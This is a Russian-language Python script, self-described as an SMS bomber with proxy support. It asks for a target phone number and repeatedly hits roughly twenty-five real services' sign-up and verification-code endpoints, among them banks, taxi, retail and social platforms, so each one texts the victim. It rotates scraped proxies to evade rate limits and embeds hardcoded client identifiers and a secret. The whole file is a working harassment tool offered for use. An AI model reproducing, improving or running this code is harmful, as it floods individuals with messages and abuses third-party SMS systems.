from termcolor import colored
import fake_useragent
from selenium import webdriver
import requests
import os,time,random
from colorama import Fore,Style
import requests
import random
import datetime
import sys
import re
from tqdm import tqdm
from time import sleep
import datetime
import json
import threading
from threading import Thread
from colorama import Fore, Back, Style
from random import randint

os.system('cls')

line = """===================================================="""


logo = """
====================================================
> Название:killer phone with proxy  (v3.4)
> Обновление:09.09.2021
> Описание: смс бомбер с прокси!
> Группа: https://t.me/hackersofter                     
> версия: (v3.4)
====================================================  """
print(Fore.CYAN + logo)


user = fake_useragent.UserAgent().random
headers = {'user-agent': user}

phone = input(colored("Введите номер телефонa + ", "green"))
k = input(colored("Введите количество кругов от 1 до 100: ", "green"))
print(colored(line,"magenta"))
xs = input(colored('1 Запустить смс бомбер с прокси\n2 добавить свой прокси\n> ', 'magenta'))


def sms_bomber():
    ch = 0
    if int(k) <= 0:
        print(colored("Недопустимое количество кругов",'red'))
    else:
        for xy in range(int(k)):
            if phone[:1] == "+" or len(phone) == "0":
                print(colored("Номер введён неправильно",'red'))
                break
            else:
                for xyy in range(int(k)):
                    try:
                        a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
                                          headers=headers, timeout=5.05)
                        print(colored('\nсообщение от citilink отправлено', 'green'))
                    except:
                        print(colored('\nсообщение от citilink не отправлено', 'red'))
                    try:
                        a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                          json={"reqId": "91101-1606335718",
                                                "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                           "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                                          headers=headers, timeout=5.05)
                        print(colored('сообщение от icq отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от icq не отправлено', 'red'))
                    try:
                        a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/",
                                          data={"FastAuthorizationLoginLoadForm[login]": phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от dns-shop.ru отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от dns-shop.ru не отправлено', 'magenta'))
                    try:
                        a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
                                          json={"phone": "+" + phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от lenta.com отправлено', 'blue'))
                    except:
                        print(colored('сообщение от lenta.com не отправлено', 'red'))
                    try:
                        a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                          json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от taxi.yandex отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от taxi.yandex не отправлено', 'red'))
                    try:
                        a = requests.post("https://youla.ru/web-api/auth/request_code",
                                          json={"phone": phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от youla отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от youla не отправлено', 'red'))
                    try:
                        a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                            "msisdn": phone,
                            "locale": "en",
                            "countryCode": "ru",
                            "version": "1",
                            "k": "ic1rtwz1s1Hj1O0r",
                            "r": "46763"
                        }, headers=headers, timeout=5.05)
                        print(colored('сообщение от icq.com отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от icq.com не отправлено', 'red'))
                    try:
                        a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                          json={"phone_number": phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от eda.yandex отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от eda.yandex не отправлено', 'red'))
                    try:
                        a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                          data={"phone": phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от shop.vsk отправлено', 'green'))
                    except:
                        print(colored('сообщение от shop.vsk не отправлено', 'red'))
                    try:
                        a = requests.post(
                            "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                            data={"st.r.phone": "+" + phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от ok.ru отправлено', 'blue'))
                    except:
                        print(colored('сообщение от ok.ru не отправлено', 'red'))
                    try:
                        a = requests.post("https://nn-card.ru/api/1.0/register",
                                          json={"phone": phone, "password": 'DDd7873456'}, headers=headers, timeout=5.05)
                        print(colored('сообщение от nn-card отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от nn-card не отправлено', 'red'))
                    try:
                        a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                          json={"CellPhone": phone[1:]}, headers=headers, timeout=5.05)
                        print(colored('сообщение от my.modulbank отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от my.modulbank не отправлено', 'red'))
                    try:
                        a = requests.post(
                            "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                            data={"phone": "+" + phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от tinkoff отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от tinkoff не отправлено', 'yellow'))
                    try:
                        a = requests.post(
                            "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                            data={"l": phone[1:]}, headers=headers, timeout=5.05)
                        print(colored('сообщение от rutaxi отправлено', 'green'))
                    except:
                        print(colored('сообщение от rutaxi не отправлено', 'red'))
                    try:
                        a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                          data={"CellPhone": phone[1:]}, headers=headers, timeout=5.05)
                        print(colored('сообщение от modulbank отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от modulbank не отправлено', 'red'))
                    try:
                        a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                          json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                                "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
                                          headers=headers, timeout=5.05)
                        print(colored('сообщение от webbankir отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от webbankir не отправлено', 'red'))
                    try:
                        a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                          json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                                "Mobile": phone[1:],
                                                "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}},
                                          headers=headers, timeout=5.05)
                        print(colored('сообщение от tiktok отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от tiktok не отправлено', 'red'))
                    try:
                        a = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone},
                                          headers=headers, timeout=5.05)
                        print(colored('сообщение от sunlight отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от sunlight не отправлено', 'red'))
                    try:
                        a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                          json={
                                              "phone": "+" + phone,
                                              "api": 2,
                                              "email": 'dgirherfib@gmaqil.com',
                                              "x-email": "x-email",
                                          }, headers=headers, timeout=5.05)
                        print(colored('сообщение от mail.ru отправлено', 'blue'))
                    except:
                        print(colored('сообщение от mail.ru отправлено', 'blue'))
                    try:
                        a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                          data={
                                              "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                              "username": phone,
                                              "client_id": "android-qw",
                                              "client_secret": "zAm4FKq9UnSe7id",
                                          }, headers=headers, timeout=5.05)
                        print(colored('сообщение от qiwi отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от qiwi не отправлено', 'magenta'))
                    try:
                        a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                          json={"phone": "+" + phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от tiktok отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от tiktok не отправлено', 'yellow'))
                    try:
                        a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                                          json={
                                              "birthday": {"day": 12, "month": 10, "year": 2000},
                                              "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                              "include_verification_code": True,
                                              "password": 'Danil5564554',
                                              "phone_number": phone,
                                              "username": 'bhtrtrrrtbhtrbhtr',
                                          }, headers=headers, timeout=5.05)
                        print(colored('сообщение от twitch.tv отправлено', 'yellow'))
                    except:
                        print(colored('сообщение от twitch.tv не отправлено', 'yellow'))
                    try:
                        a = requests.post("https://my.telegram.org/auth/send_password",
                                          data={"phone": "+" + phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от telegram отправлено', 'magenta'))
                    except:
                        print(colored('сообщение от telegram не отправлено', 'magenta'))
                    try:
                        a = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                                          params={'msisdn': phone}, headers=headers, timeout=5.05)
                        print(colored('сообщение от mts.ru отправлено', 'cyan'))
                    except:
                        print(colored('сообщение от mts.ru не отправлено', 'cyan'))
                    try:
                        a = requests.post('https://www.etm.ru/cat/runprog.html',
                                          data={'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services',
                                                'getSysParam': 'yes'}, headers=headers, timeout=5.05)
                        print(colored('сообщение от etm.ru отправлено', 'green'))
                    except:
                        print(colored('сообщение от etm.ru не отправлено', 'green'))
                    ch += 1
                    e = int(k) - ch

                    print(colored("\nкруг закончен, осталось ещё " + str(e) + " #\n", 'green'))

                print(colored('bomber остановлен!', 'magenta'))
                break



def updateproxy():
				global proxy
				global info
				try:
					print ("Введите proxy в формате ip:port.")
					print ("Пример: "+Fore.GREEN+"123.45.6.78:8080"+Style.RESET_ALL)
					print ("Для отмены нажмите Ctrl+C")
					proxy = input(Fore.BLUE+"ваш прокси > "+Style.RESET_ALL)
					if proxy == "":
						info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
						proxy = "localhost"
					else:
						print("Проверка прокси...")
						ip = requests.get("http://fsystem88.ru/ip", verify=False, timeout=10).text
						try:
							ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}, verify=False, timeout=10).text
						except:
							ipx = ip
						if ip != ipx:
							info = Fore.GREEN+"Proxy валидный!"+Style.RESET_ALL
						else:
							print(Fore.RED+"{}  Прокси не валидный. Введите новый!".format(proxy)+Style.RESET_ALL)
							updateproxy()
				except:
					info = Fore.RED + "\nНекорректно введены данные!"
					proxy = "localhost"

def generateproxy():
				global proxy
				global info

				print(Fore.YELLOW + "Генерация валидного прокси.\nОбычно это занимает не больше 30 секунд..."+Style.RESET_ALL)
				url="https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=RU"
				req = requests.get(url)
				ip = requests.get("http://fsystem88.ru/ip").text
				array = req.text.split()
				open("proxies.txt", "w+").close()
				for prox in array:
					thread_list = []
					t = threading.Thread (target=checkproxy, args=(ip, prox))
					thread_list.append(t)
					t.start()
				time.sleep(20)
				f = open("proxies.txt")
				proxies = f.read().split()
				proxy = random.choice(proxies)
				os.system('cls')
info = Fore.GREEN + "Валидный прокси найден!"

def checkproxy(ip, prox):
				try:
					ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=10).text
				except:
					ipx = ip
				if ip != ipx:
					f = open("proxies.txt", "a+")
					f.write("{}\n".format(prox))
					f.close()


def progress_bar():
 print("Загрузка...")
for i in tqdm(range(100),colour="green"):
 sleep(random.uniform(0.01, 0.1))    

if xs == "1":
    generateproxy()
    time.sleep(2)
    progress_bar()
    time.sleep(6)
    print(colored(line,"magenta"))
    sms_bomber()

elif xs == "2":



    updateproxy()
    time.sleep(2)
    sms_bomber()
else:
    print(colored(k + "Неизвестная команда!","red"))
    time.sleep(10)
    exits()

def exits():
 exit("")
